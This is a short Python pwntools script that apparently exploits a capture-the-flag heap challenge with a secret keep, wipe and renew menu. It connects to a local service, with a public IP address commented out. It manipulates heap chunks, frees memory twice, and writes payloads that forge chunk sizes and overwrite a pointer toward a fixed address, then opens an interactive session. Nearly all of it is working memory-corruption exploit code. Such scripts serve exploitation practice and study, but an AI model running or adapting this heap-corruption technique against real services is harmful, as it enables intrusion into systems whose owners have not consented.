#!/usr/bin/python

from pwn import *

DEBUG = True

#p = remote("52.68.31.117", 5566)
p = remote('localhost', 4924)
#p = remote("localhost", 4000)

SMALL = 1
BIG = 2
HUGE = 3

size = [0, 0x28, 0xfa0, 0x61a80]

def r(msg):
  response = p.recvuntil(msg)
  if DEBUG:
    log.info(response)
  return response

def keep(option, msg):
  r("Renew secret")
  p.sendline("1")

  r("Huge secret")
  p.sendline(str(option))

  r("secret: ") 
  p.sendline(msg)

def wipe(option):
  r("Renew secret")
  p.sendline("2")

  r("Huge secret")
  p.sendline(str(option))

def renew(option, msg):
  r("Renew secret")
  p.sendline("3")

  r("Huge secret")
  p.sendline(str(option))

  r("secret: ")
  p.sendline(msg)


keep(HUGE, "A")
wipe(HUGE)

keep(SMALL, "A")
wipe(SMALL)

keep(HUGE, "A")
wipe(HUGE)

keep(BIG, "A")

keep(SMALL, "A")
wipe(SMALL)

keep(HUGE, "A")
wipe(HUGE)

payload = p64(0)
payload += "A" * 0x20
payload += p64(0x71)
payload += "B" * 0x68
payload += p64(size[BIG] + 0x10 - 0x70 + 1)

renew(HUGE, payload)
wipe(BIG)

payload = p64(0)
payload += "C" * 0x20
payload += p64(0x71)
payload += p64(0x602095 - 0x8)

renew(HUGE, payload)

keep(BIG, "A")
#keep(SMALL, "A")

#renew(HUGE, overwrite)

p.interactive()

p.close()
